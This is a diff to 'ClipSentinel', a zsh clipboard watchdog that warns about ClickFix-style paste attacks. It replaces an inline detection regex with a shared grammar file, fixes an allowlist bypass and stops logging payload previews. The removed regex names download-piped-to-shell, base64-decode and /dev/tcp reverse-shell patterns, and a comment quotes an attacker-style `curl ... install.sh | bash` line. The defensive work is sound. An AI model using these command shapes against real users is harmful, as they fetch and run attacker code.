@@ -80,71 +80,41 @@ fi
 # ==============================================================================
 # DANGEROUS-PATTERN MATCHER
 #
-# Kept deliberately in lockstep with ShellGuard's grammar so the two layers
-# agree on what "dangerous" means. We match the *kill chain*, not the mere
-# presence of curl — matching bare `curl` would train users to ignore the
-# warning. We require:
-#   - download piped INTO an interpreter        (curl|wget|fetch ... | sh/bash/...)
-#   - eval/exec of a command substitution        (eval $(curl ...))
-#   - base64 decode piped into an interpreter     (base64 -d ... | sh)
-#   - a long base64 blob piped into base64        (echo <blob> | base64 -d ...)
-#   - bash /dev/tcp reverse-shell redirects
-#   - osascript piped into a shell
+# As of v0.1.1 the grammar is NOT defined here. ClipSentinel and ShellGuard both
+# source ../lib/clickfix-grammar.zsh, so the copy-time and execute-time layers
+# are the same code and cannot disagree.
 #
-# ALLOWLIST: well-known legitimate installers (rustup, Homebrew, nvm, oh-my-zsh,
-# Docker, Deno, Bun, get.docker.com, etc.) are suppressed. False positives are
-# the #1 reason users disable a guard, so we err toward not crying wolf on the
-# canonical install one-liners. The allowlist is host-based and intentionally
-# narrow.
+# They used to. v0.1.0's README claimed this matcher was "kept deliberately in
+# lockstep with ShellGuard's grammar"; a red-team pass found the two layers
+# disagreeing on 6 of 13 payloads. Worse, the old _is_allowlisted was a bare
+# SUBSTRING test against the whole clipboard buffer, and its list contained the
+# token 'install.sh' — so `curl https://<attacker>/get4/install.sh | bash`, the
+# shape in published AMOS IOCs, was suppressed entirely. A ClickFix page
+# controls the exact clipboard bytes, so that was a guaranteed one-token
+# silencing of this whole tool. Trust is now scheme+host+path-prefix, in one
+# shared file, asserted by ../tests/corpus.tsv on every commit.
 # ==============================================================================
 
-# Trusted install hostnames. If a download-pipe references ONLY these hosts,
-# we stay quiet. (Tighten or extend to taste — but keep it short.)
-typeset -a ALLOWLIST_HOSTS
-ALLOWLIST_HOSTS=(
-  'sh.rustup.rs'
-  'static.rust-lang.org'
-  'get.docker.com'
-  'raw.githubusercontent.com/ohmyzsh'   # oh-my-zsh installer
-  'raw.githubusercontent.com/Homebrew'  # Homebrew installer
-  'raw.githubusercontent.com/nvm-sh'    # nvm installer
-  'deno.land'
-  'bun.sh'
-  'install.sh'                           # generic local installer path token
-)
+_CLIPSENTINEL_DIR=${${(%):-%x}:A:h}
+_CLICKFIX_GRAMMAR_PATH=${CLICKFIX_GRAMMAR_PATH:-${_CLIPSENTINEL_DIR:h}/lib/clickfix-grammar.zsh}
 
-# Returns 0 (true) if the text matches the dangerous ClickFix shell grammar.
-_is_dangerous() {
-  local buf="$1"
-
-  # Regex pieces (POSIX ERE via zsh =~). Mirror of ShellGuard.
-  local re='(curl|wget|fetch)[^|;]*(\|[[:space:]]*(sudo[[:space:]]+)?(sh|bash|zsh|python[0-9.]*|perl|ruby|node|osascript))'
-  re+='|(eval|exec)[[:space:]]+["'"'"']?\$\((curl|wget|fetch)'
-  re+='|base64[[:space:]]+(--?d(ecode)?|-D)[^|]*\|[[:space:]]*(sh|bash|zsh|python[0-9.]*|perl|ruby)'
-  re+='|(echo|printf)[[:space:]]+[A-Za-z0-9+/=]{40,}[^|]*\|[[:space:]]*base64'
-  re+='|/dev/(tcp|udp)/'
-  re+='|osascript[^|]*\|[[:space:]]*(sh|bash|zsh)'
-
-  if [[ "$buf" =~ $re ]]; then
-    return 0
-  fi
-  return 1
+if [[ ! -r $_CLICKFIX_GRAMMAR_PATH ]]; then
+  print -u2 -- "[clipsentinel] FATAL: cannot read ${_CLICKFIX_GRAMMAR_PATH}"
+  print -u2 -- "[clipsentinel] refusing to run — a watchdog that silently matches nothing is worse than none."
+  exit 1
+fi
+source "$_CLICKFIX_GRAMMAR_PATH" || {
+  print -u2 -- "[clipsentinel] FATAL: grammar failed to load — refusing to run."
+  exit 1
 }
 
-# Returns 0 (true) if EVERY URL/host reference in the buffer is on the
-# allowlist — i.e. this looks like a known-good installer and we should stay
-# quiet. If there is any off-allowlist host, we do NOT suppress.
-_is_allowlisted() {
-  local buf="$1"
-  local h matched=0 hit
-  for h in "${ALLOWLIST_HOSTS[@]}"; do
-    if [[ "$buf" == *"$h"* ]]; then
-      matched=1
-      break
-    fi
-  done
-  (( matched == 1 )) && return 0
-  return 1
+# Returns 0 (true) if the clipboard text should raise an alert.
+# ClipSentinel alerts on both the 'block' and 'warn' tiers: at copy time there
+# is no confirmation to gate, only awareness to offer, and a heads-up costs the
+# user nothing but a banner.
+_is_dangerous() {
+  clickfix_check "$1"
+  [[ $CLICKFIX_VERDICT != silent ]]
 }
 
 # ==============================================================================
@@ -204,12 +174,20 @@ APPLESCRIPT
 # Append an event to the log if a logfile is configured. We log the PREVIEW
 # only (truncated), with a timestamp — never the full payload, never anywhere
 # off-machine.
+#
+# v0.1.0 logged a 117-character PREVIEW of the copied text, which contained the
+# attacker URL — while the README said contents "are never stored or sent
+# anywhere," and the shipped LaunchAgent set CLIPSENTINEL_LOG by default. So
+# the tool's own log was a plaintext record of everything dangerous the user
+# ever copied. It now records only the verdict, the reason, and a truncated
+# hash: enough to correlate two events as the same payload, never enough to
+# recover the payload. The README now matches this behaviour.
 _log_event() {
   [[ -z "$LOGFILE" ]] && return 0
-  local preview="$1"
-  preview="${preview//$'\n'/ }"
-  (( ${#preview} > 120 )) && preview="${preview[1,117]}..."
-  print -r -- "$(date '+%Y-%m-%dT%H:%M:%S%z')  DANGEROUS_COPY  ${preview}" >> "$LOGFILE" 2>/dev/null || true
+  local digest
+  digest="$(print -r -- "$1" | _hash)"
+  print -r -- "$(date '+%Y-%m-%dT%H:%M:%S%z')  ${(U)CLICKFIX_VERDICT}  sha256:${digest[1,12]}  ${CLICKFIX_REASONS[1]:-unclassified}" \
+    >> "$LOGFILE" 2>/dev/null || true
 }
 
 # ==============================================================================
@@ -242,15 +220,12 @@ while true; do
   if [[ "$cur_hash" != "$last_hash" ]]; then
     last_hash="$cur_hash"
 
+    # Trust is decided inside clickfix_check: a command whose every URL is a
+    # known single-tenant installer (or an allowlisted host+path prefix)
+    # returns 'silent', so there is no separate allowlist step to get wrong.
     if [[ -n "$cur" ]] && _is_dangerous "$cur"; then
-      if _is_allowlisted "$cur"; then
-        # Known-good installer one-liner — stay quiet (but note it on the log
-        # so a curious user can audit suppressions).
-        [[ -n "$LOGFILE" ]] && print -r -- "$(date '+%Y-%m-%dT%H:%M:%S%z')  ALLOWLISTED_COPY  (suppressed)" >> "$LOGFILE" 2>/dev/null || true
-      else
-        _notify "$cur"
-        _log_event "$cur"
-      fi
+      _notify "$cur"
+      _log_event "$cur"
     fi
   fi
 
